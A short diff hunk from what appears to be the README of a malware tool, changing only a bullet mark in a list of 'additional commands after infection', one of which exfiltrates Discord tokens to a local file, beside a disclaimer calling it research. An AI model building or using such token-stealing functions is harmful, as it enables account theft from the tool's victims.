@@ -23,7 +23,7 @@ $ run
 I am not responsible for the usage of this utility, it is simply for researching and experimentation for myself. The user, YOU take full responsibility for your actions.
 
 # Have fun!
-• Additional commands after infection
+Additional commands after infection
   /tgrizzly
   - exfiltrates discord tokens and saves them to C:\temp\output.txt
   /wifi
